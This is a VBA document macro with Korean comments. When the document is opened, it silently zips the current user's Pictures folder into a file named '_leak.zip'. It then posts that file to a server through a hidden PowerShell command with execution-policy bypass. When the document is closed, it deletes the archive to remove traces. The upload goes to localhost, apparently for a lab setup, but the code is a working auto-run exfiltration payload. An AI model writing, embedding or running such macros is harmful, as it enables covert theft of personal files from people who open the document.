Private Sub Document_Open()
    CompressAndUploadFile
End Sub

Sub CompressAndUploadFile()
    Dim objShell As Object
    Dim username As String
    Dim sourceFolderPath As String
    Dim zipFilePath As String
    Dim httpAddress As String
    Dim cmdStr As String
    Dim startTime As Double ' 시작 시간 기록
    Dim elapsedTime As Double ' 경과 시간
    
    ' 시작 시간 기록
    startTime = Timer
    
    ' 현재 사용자의 사용자명 가져오기
    username = Environ("USERNAME")
    
    ' Documents 폴더 경로 설정
    sourceFolderPath = "C:\Users\" & username & "\Pictures\"
    
    ' 압축된 파일의 저장 경로 설정
    zipFilePath = "C:\TEMP\" & username & "_leak.zip"

    ' 압축 파일 생성
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -command ""Compress-Archive -Path '" & sourceFolderPath & "' -DestinationPath '" & zipFilePath & "'""", 0, False
    Set objShell = Nothing
    
    ' 압축 파일이 생성될 때까지 무한 루프 실행
    Do While Dir(zipFilePath) = ""
        ' 1초 대기
        Do Until Timer - startTime >= 1
        Loop
    Loop

    ' 파일을 파이썬 서버로 업로드하기 위한 파워쉘 실행 명령어 설정
    cmdStr = "powershell.exe -WindowStyle Hidden -noexit -ep bypass -c Invoke-RestMethod -Uri 'http://127.0.0.1:8000' -Method Post -InFile '" & zipFilePath & "'"

    ' 파워쉘 실행
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run cmdStr, 0, False
    Set objShell = Nothing
End Sub




Private Sub Document_Close()
    Dim username As String
    Dim zipFilePath As String
    
    ' 현재 사용자의 사용자명 가져오기
    username = Environ("USERNAME")
    
    ' 압축된 파일의 경로 설정
    zipFilePath = "C:\TEMP\" & username & "_leak.zip"
    
    ' 파일이 존재하는지 확인한 후 삭제
    If Dir(zipFilePath) <> "" Then
        Kill zipFilePath
    End If
End Sub

